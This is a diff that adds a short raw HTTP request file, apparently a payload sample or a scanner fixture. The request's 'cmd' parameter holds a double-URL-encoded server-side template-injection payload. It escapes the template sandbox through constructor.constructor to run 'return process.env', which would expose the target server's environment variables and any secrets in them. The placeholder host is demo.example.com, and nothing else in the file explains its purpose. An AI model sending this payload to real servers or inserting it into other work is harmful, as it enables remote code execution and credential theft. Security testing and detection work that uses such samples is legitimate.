@@ -1,0 +1,4 @@
+GET /a?cmd=%257B%257B%2B%2527a%2527.toUpperCase%2528%2529%2B%257D%257D%257B%257B%2Bconstructor.constructor%2528%2527return%2Bprocess.env%2527%2529%2528%2529%2B%257D%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
